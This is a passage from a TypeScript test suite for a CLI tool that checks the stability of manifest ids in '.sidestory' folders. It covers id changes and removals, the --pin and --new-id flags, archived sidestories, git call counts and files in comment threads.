    const text = await run(['--coverage', '--base', head, '--repo', dir]);
    expect(slash(text.out)).toMatch(/\.sidestory\/landed\/manifest\.json:3: error id-changed:/);
  });

  it('a removed or invalid id is id-removed', async () => {
    const { dir, head } = withLanded();
    writeFileSync(join(dir, '.sidestory/landed/manifest.json'), landed());
    expect(ids(await json(['--coverage', '--base', head, '--repo', dir])).map((f) => f.code)).toEqual(['id-removed']);
    writeFileSync(join(dir, '.sidestory/landed/manifest.json'), landed().replace('"version": 2,', '"version": 2,\n  "id": "not-a-ulid",'));
    expect(ids(await json(['--coverage', '--base', head, '--repo', dir])).map((f) => f.code)).toEqual(['id-removed']);
  });

  it('committed changes count too (--committed), a move to another package under the same name too', async () => {
    const { dir, head } = withLanded();
    writeFileSync(join(dir, '.sidestory/landed/manifest.json'), landed(B));
    git(dir, 'commit', '-q', '-a', '--no-verify', '-m', 'Rewrite');
    const r = await json(['--coverage', '--base', head, '--committed', '--repo', dir]);
    expect(ids(r).map((f) => [f.code, slash(f.file).slice(-'.sidestory/landed/manifest.json'.length)])).toEqual([['id-changed', '.sidestory/landed/manifest.json']]);
    const moved = withLanded();
    mkdirSync(join(moved.dir, 'pkg'));
    git(moved.dir, 'mv', '.sidestory', 'pkg/.sidestory');
    writeFileSync(join(moved.dir, 'pkg/.sidestory/landed/manifest.json'), landed(B));
    git(moved.dir, 'commit', '-q', '-a', '--no-verify', '-m', 'Move and rewrite');
    const m = await json(['--coverage', '--base', moved.head, '--committed', '--repo', moved.dir]);
    expect(ids(m).map((f) => [f.code, slash(f.file).slice(-'pkg/.sidestory/landed/manifest.json'.length)])).toEqual([['id-changed', 'pkg/.sidestory/landed/manifest.json']]);
  });

  it('a manifest renamed into a folder of another name is not compared (git may pair two different sidestories)', async () => {
    const { dir, head } = withLanded();
    git(dir, 'mv', '.sidestory/landed', '.sidestory/other');
    writeFileSync(join(dir, '.sidestory/other/manifest.json'), landed(B));
    git(dir, 'commit', '-q', '-a', '--no-verify', '-m', 'Rename and rewrite');
    expect(ids(await json(['--coverage', '--base', head, '--committed', '--repo', dir]))).toEqual([]);
  });

  it('--pin puts back an id the manifest had, instead of writing a new one', async () => {
    const dir = copy();
    const file = join(dir, '.sidestory/retry-jitter/manifest.json');
    const m = JSON.parse(readFileSync(file, 'utf8'));
    delete m.id;
    writeFileSync(file, JSON.stringify(m, null, 2));
    const r = await json([join(dir, '.sidestory/retry-jitter'), '--pin', '--coverage'], { newId: () => B });
    expect(r.pin!.id).toBe(RETRY);
    expect(JSON.parse(readFileSync(file, 'utf8')).id).toBe(RETRY);
    expect(ids(r)).toEqual([]);
  });

  it('nothing when the id is kept, the old manifest had none, or the sidestory is new', async () => {
    const { dir, head } = withLanded();
    writeFileSync(join(dir, '.sidestory/landed/manifest.json'), landed(A).replace('"Landed"', '"Landed, retitled"'));
    expect(ids(await json(['--coverage', '--base', head, '--repo', dir]))).toEqual([]);
    const none = withLanded(null);
    writeFileSync(join(none.dir, '.sidestory/landed/manifest.json'), landed(B));
    expect(ids(await json(['--coverage', '--base', none.head, '--repo', none.dir]))).toEqual([]);
    // The fixture's own sidestory is added on the branch: no merge-base version, and the working tree equals HEAD.
    expect(ids(await json(['--coverage', '--base', 'main', '--repo', fixture]))).toEqual([]);
  });

  it('archived, with a new sidestory under the old name: the old id lives in the archive, so the new id is fine', async () => {
    const { dir, head } = withLanded();
    mkdirSync(join(dir, '.sidestory/archive/2026-10-24-landed'), { recursive: true });
    renameSync(join(dir, '.sidestory/landed/manifest.json'), join(dir, '.sidestory/archive/2026-10-24-landed/manifest.json'));
    renameSync(join(dir, '.sidestory/landed/sidestory.html'), join(dir, '.sidestory/archive/2026-10-24-landed/sidestory.html'));
    writeFileSync(join(dir, '.sidestory/landed/manifest.json'), landed(B));
    writeFileSync(join(dir, '.sidestory/landed/sidestory.html'), page);
    expect(ids(await json(['--coverage', '--base', head, '--repo', dir]))).toEqual([]);
  });

  it('--new-id: a deliberate replacement under the same name; it goes with --coverage', async () => {
    const { dir, head } = withLanded();
    writeFileSync(join(dir, '.sidestory/landed/manifest.json'), landed(B));
    expect(ids(await json(['--coverage', '--base', head, '--new-id', '--repo', dir]))).toEqual([]);
    const r = await run([join(dir, '.sidestory/landed'), '--new-id']);
    expect(r.code).toBe(2);
    expect(r.err).toContain('--new-id go with --coverage');
  });

  it('git calls don’t grow with the number of sidestories a change touches (one ls-tree or blob batch per commit)', async () => {
    const calls = vi.spyOn(Git.prototype, 'run');
    const spawns = async (k: number, committed: boolean) => {
      const dir = copy();
      for (let i = 0; i < k; i++) {
        mkdirSync(join(dir, `.sidestory/l${i}`), { recursive: true });
        writeFileSync(join(dir, `.sidestory/l${i}/manifest.json`), landed(`01JC0AANDED0000000000000${String(i).padStart(2, '0')}`));
        writeFileSync(join(dir, `.sidestory/l${i}/sidestory.html`), page);
      }
      git(dir, 'add', '-A');
      git(dir, 'commit', '-q', '--no-verify', '-m', 'Landed');
      const head = git(dir, 'rev-parse', 'HEAD');
      // Each one edited (its id kept), and one archived.
      for (let i = 0; i < k; i++) writeFileSync(join(dir, `.sidestory/l${i}/manifest.json`), landed(`01JC0AANDED0000000000000${String(i).padStart(2, '0')}`).replace('"Landed"', '"Edited"'));
      mkdirSync(join(dir, '.sidestory/archive/2026-10-24-l0'), { recursive: true });
      renameSync(join(dir, '.sidestory/l0/sidestory.html'), join(dir, '.sidestory/archive/2026-10-24-l0/sidestory.html'));
      if (committed) {
        git(dir, 'add', '-A');
        git(dir, 'commit', '-q', '--no-verify', '-m', 'Edit');
      }
      calls.mockClear();
      const r = await json(['--coverage', '--base', head, ...(committed ? ['--committed'] : []), '--repo', dir]);
      expect(ids(r)).toEqual([]);
      return calls.mock.calls.length;
    };
    try {
      for (const committed of [false, true]) expect(await spawns(12, committed)).toBe(await spawns(2, committed));
    } finally {
      calls.mockRestore();
    }
  });

  it('the working tree against HEAD: a sidestory added on the branch keeps the id it was committed with', async () => {
    const dir = copy();
    const file = join(dir, '.sidestory/retry-jitter/manifest.json');
    const m = JSON.parse(readFileSync(file, 'utf8'));
    writeFileSync(file, JSON.stringify({ ...m, id: B }, null, 2));
    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
    expect(ids(r).map((f) => f.code)).toEqual(['id-changed']);
    expect(ids(r)[0]!.message).toMatch(new RegExp(`it was "${RETRY}" at HEAD \\([0-9a-f]{7}\\)`));
    // --committed reads HEAD, where nothing changed.
    expect(ids(await json(['--coverage', '--base', 'main', '--committed', '--repo', dir]))).toEqual([]);
    delete m.id;
    writeFileSync(file, JSON.stringify(m, null, 2));
    expect(ids(await json(['--coverage', '--base', 'main', '--repo', dir])).map((f) => f.code)).toEqual(['id-removed']);
  });

  it("--pin never puts back an archived sidestory's id, and prefers HEAD's id to the merge-base's", async () => {
    // Archived x (id A) with a new x in its place, its id not written yet: --pin writes a new one.
    const { dir, head } = withLanded();
    mkdirSync(join(dir, '.sidestory/archive/2026-10-24-landed'), { recursive: true });
    renameSync(join(dir, '.sidestory/landed/manifest.json'), join(dir, '.sidestory/archive/2026-10-24-landed/manifest.json'));
    renameSync(join(dir, '.sidestory/landed/sidestory.html'), join(dir, '.sidestory/archive/2026-10-24-landed/sidestory.html'));
    const fresh = JSON.parse(landed());
    writeFileSync(join(dir, '.sidestory/landed/manifest.json'), JSON.stringify({ ...fresh, version: 3, base: head }, null, 2));
    writeFileSync(join(dir, '.sidestory/landed/sidestory.html'), page);
    const r = await json([join(dir, '.sidestory/landed'), '--pin', '--coverage'], { newId: () => B });
    expect(r.pin!.id).toBe(B);
    // Committed with id B on the branch, then the id dropped in the working tree: --pin puts back B, not A.
    const two = withLanded();
    writeFileSync(join(two.dir, '.sidestory/landed/manifest.json'), JSON.stringify({ ...JSON.parse(landed(B)), version: 3, base: two.head }, null, 2));
    git(two.dir, 'commit', '-q', '-a', '--no-verify', '-m', 'Replace');
    writeFileSync(join(two.dir, '.sidestory/landed/manifest.json'), JSON.stringify({ ...JSON.parse(landed()), version: 3, base: two.head }, null, 2));
    const before = await json(['--coverage', '--base', two.head, '--repo', two.dir]);
    expect(ids(before).map((f) => f.code)).toEqual(['id-removed']);
    expect(ids(before)[0]!.message).toContain(`Put back "id": "${B}"`);
    const p = await json([join(two.dir, '.sidestory/landed'), '--pin', '--coverage'], { newId: () => '01JC0000000000000000000ABC' });
    expect(p.pin!.id).toBe(B);
  });

  it('idProblem: an id against the one before, the archive excusing a moved one', () => {
    expect(idProblem(undefined, 'B', new Set())).toBeUndefined();
    expect(idProblem('A', 'A', new Set())).toBeUndefined();
    expect(idProblem('A', 'B', new Set())).toBe('id-changed');
    expect(idProblem('A', undefined, new Set())).toBe('id-removed');
    expect(idProblem('A', 'B', new Set(['A']))).toBeUndefined();
    expect(idProblem('A', undefined, new Set(['A']))).toBeUndefined();
  });
});

describe('shared comment threads (docs/COMMENTS-PLAN.md §3.1)', () => {
  it("are the sidestory's own files: not counted, so sharing a comment never leaves a change unexplained", async () => {
    const dir = copy();
    const t = join(dir, '.sidestory/retry-jitter/threads/t_01JC0AANDED00000000000000A');
    mkdirSync(t, { recursive: true });
    const event = (id: string) => `${JSON.stringify({ v: 1, id, thread: 't_01JC0AANDED00000000000000A', type: 'open', at: '2026-10-24T10:00:00.000Z', by: { kind: 'human', name: 'Alex' }, anchor: { kind: 'step', step: 'jitter' }, body: 'Why?' })}\n`;
    writeFileSync(join(t, 'e_01JC0REP4ACED0000000000000.json'), event('e_01JC0REP4ACED0000000000000'));
    // Named like an event but not one (data some code might load), or naming another event: counted like code.
    writeFileSync(join(t, 'e_01JC0REP4ACED0000000000001.json'), '{"retries": 99}\n');
    writeFileSync(join(t, 'e_01JC0REP4ACED0000000000002.json'), event('e_01JC0REP4ACED0000000000000'));
    // Anything else there is code like any other.
    writeFileSync(join(t, 'run.js'), 'module.exports = 1;\n');
    const r = await json(['--coverage', '--base', 'main', '--repo', dir]);
    const paths = r.coverage.files.map((f) => f.path);
    const base = '.sidestory/retry-jitter/threads/t_01JC0AANDED00000000000000A';
    expect(paths.filter((p) => p.includes('/threads/'))).toEqual([`${base}/e_01JC0REP4ACED0000000000001.json`, `${base}/e_01JC0REP4ACED0000000000002.json`, `${base}/run.js`]);
  });
});
